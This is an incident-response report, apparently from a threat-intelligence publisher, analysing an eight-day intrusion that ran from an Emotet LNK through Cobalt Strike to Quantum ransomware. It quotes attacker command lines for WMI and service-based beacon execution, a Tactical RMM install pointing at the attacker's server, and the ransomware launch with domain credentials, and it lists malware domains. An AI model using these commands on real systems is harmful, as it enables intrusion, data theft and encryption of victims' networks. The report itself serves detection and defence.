# Case Summary

The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer. Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host.

Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers. These commands would go on to be repeated daily by the Emotet process. Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.

Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host. Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity. Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.

The threat actor then moved laterally to a workstation. They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server. Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory. This beacon was then successfully executed via WMI and connected successfully to the threat actors server.

Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again. They then proceeded to dump credentials from the LSASS process on the host. With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server. This Cobalt Strike server stopped communicating shortly there after.

On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon. Again, some net command discovery was run for domain admins and domain controller servers. A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.

The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s. On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat , which executed AdFind active directory discovery and performed a ping sweep across the environment.

On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment. From this server, the threat actors were observed using Rclone to exfiltrate data from a file share server in the environment. The Mega.io service was the location the stolen data was sent.

On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some data from the mail server again using Rclone but this appeared to fail and the threat actors did not try to resolve the issue. After this the threat actors went silent until the eighth and final day of the intrusion.

On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host. After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify hosts across the environment.

From there, the threat actors began connecting to other hosts via RDP, including the a backup server. After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions. Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB. From initial intrusion to ransomware deployment, 154 hours passed, over eight days.

After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command. With no other activity taking place, we assess that this was likely the threat actors confirming successful deployment of the ransomware payload across the network.

# Analysis

Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign.

The Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes. The script will decode itself rather than depend on Powershell’s built-in ability to execute encoded scripts.

The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware. Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload via regsvr32.exe .

It is interesting to note, the LNK identifies the machine it was created on through the NetBIOS name of black-dog and a MAC Address beginning with 08:00:27 indicating a system running on Virtualbox.

Once the PowerShell script from the LNK file executed successfully, Emotet began execution. Emotet will initially copy itself to a randomly named folder in the users temporary folder.

Multiple instances of Emotet spawning itself was observed over a period of three days. Almost all the instances of Emotet included three enumeration commands executed:

systeminfo ipconfig /all nltest /dclist:

Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed. This access was used to perform enumeration and move laterally to other hosts.

The following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike.

The Emotet malware has used various persistence methods over time, an example can be seen here.

On the first day, Emotet established persistence via a run key.

As we can see, the regsvr32.exe Windows’s native utility was used to launch the Emotet DLL.

After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment. Tactical RMM was the first tool chosen for deployment. Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.

The file 17jun.exe, was deployed into the programdata folder on one of the servers. This was then executed by the threat actors and resulted in the installation of the main RMM agent. The install completed with the following command.


A service was also created for the agent.


A service was installed in the system.

Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent.

A service was installed in the system.

On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.

A service was installed in the system.

We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it. One indicator is the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.

During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is one of the indicators of a Zerologon attempt.

# Process Injection

The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.

The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread. This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.

The following table summarizes the processes used for injection during this case:



# PowerTool

PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload. This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files. It has been reportedly used by several ransomware groups to aid in their operations [1][2][3][4].

As a byproduct of execution, PowerTool will drop a driver to disk and load it into the system.




# Indicator Removal

The threat actor was observed deleting files that had been dropped to disk.

Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike. The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report.

We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.

During the initial Emotet execution, three automated discovery commands were observed. These were then repeated, seen occurring once a day from the Emotet host.

systeminfo ipconfig /all nltest /dclist:

Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead.
- whoami /groups 
- net group /domain 
- net group "domain computers" /domain 
- net group /domain "Domain controllers" 
- net group "domain admins" /domain nltest /trusted_domains

The threat actor was observed querying a non-existent group Domain controller, followed by a command correcting the mistake that queried the group Domain controllers .

net group /domain "Domain controller" net group /domain "Domain controllers"

A ping command issued to a user workstation and a domain controller were observed moments before lateral movement was attempted.

ping COMPUTER.REDACTED.local

Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike:

In addition to the Invoke-ShareFinder command, other functions that were used by the script were also observed.

The remnants of Invoke-ShareFinder could also be seen on the network through the consistent querying of “ADMIN$” and “C$” shares for each host over a short period of time. In addition to these shares, a few shares from the file servers were also accessed.

Once on the domain controller, two batch files were run. The first find.bat was used to run AdFind.exe for Active Directory discovery.

The second script, p.bat, was run to sweep the network using ping, looking for network connectivity and online hosts.

On the final day, prior to ransom deployment, the threat actor also dropped netscan.exe on the server, and executed it from the Tactical RMM meshagent.exe session.

# Cobalt Strike Remote Service Creation

The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts.

C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA

# WMI

In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI.

wmic /node:IP_Address process call create "cmd.exe /c start C:\Progradata\sc_https_x64.exe"

# Remote Desktop

Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment.

On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents.

These documents were again reviewed by the threat actor on the final day of the intrusion. Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance.

# Emotet

The Emotet loader pulled the main second stage payload from the following domains:
- hxxps://descontador[.]com[.]br 
- hxxps://www.elaboro[.]pl 
- hxxps://el-energiaki[.]gr 
- hxxp://drechslerstammtisch[.]de 
- hxxp://dhnconstrucciones[.]com[.]ar 
- hxxp://dilsrl[.]com

The second stage loader had multiple IP addresses in its configuration to attempt connections to:

# Cobalt Strike

The following Cobalt Strike C2 servers were observed being used. Both HTTP and HTTPS were observed to be used.
The following are the Cobalt Strike configurations observed:


# Tactical RMM Agent

The threat actor dropped a Tactical RMM Agent on one of the servers as an alternative command and control avenue to access the network. During the installation of the software, the following command was observed:

"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth REDACTED

This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent. This domain was registered very close to the timeline of this incident.

A domain registered to be used with Tactical RMM Agent will have both an api and mesh subdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com . These were both hosted on the same server IP: 212.73.150.62.

In addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use:

icanhazip.tacticalrmm.io

# AnyDesk

On the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on. Using this RMM agent they proceeded to install AnyDesk on the host. The following process activity was observed from meshagent.exe.



The decoded base 64 content reveals commands for console access and connect actions.

This is then followed by the following process flow:

Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host.



Also seen in our last report on Emotet, threat actors leveraged Rclone to exfiltrate data to Mega (Mega.nz) storage services.



From the rclone.conf file, the threat actors left the details of the remote account being used.

With the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out of the environment.

# Spam Email

During the first two days, Emotet sent outbound spam emails over SMTP:

The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS:

# Ransomware

Towards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain. They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk. Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don’t Sleep.

Don’t Sleep has the capability to keep the computer from being shutdown and the user from being signed off. This was likely done to ensure nothing will interfere with the propagation of the ransomware payload.

Finally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“. The script invoked the main ransomware payload, locker.dll, and passed a list of all the computers in the domain to the target parameter.

rundll32.exe locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$ /TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$ /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall

The executable began to encrypt all the targeted hosts in the environment and dropped a ransom note: README_TO_DECRYPT.html

After the invocation of the ransomware payload, about a minute later, the threat actor launched Process Hacker. We believe this was to monitor the execution of the ransomware payload.

All systems in the domain were encrypted and presented with a ransom message.

# MITRE ATT&CK DATASET
PowerShell – T1059.001

Process Injection – T1055

File Deletion – T1070.004

Lateral Tool Transfer – T1570

Valid Accounts – T1078

Service Execution – T1569.002

SMB/Windows Admin Shares – T1021.002

Remote System Discovery – T1018

Process Discovery – T1057

Rundll32 – T1218.011

Regsvr32 – T1218.010

Domain Account – T1087.002

Domain Groups – T1069.002

System Information Discovery – T1082

Data Encrypted for Impact – T1486

Network Share Discovery – T1135

Data from Network Shared Drive – T1039

Web Protocols – T1071.001

Remote Access Software – T1219

Exfiltration to Cloud Storage – T1567.002

Remote Desktop Protocol – T1021.001

Malicious File – T1204.002

Spearphishing Attachment – T1566.001

Exploitation of Remote Services – T1210
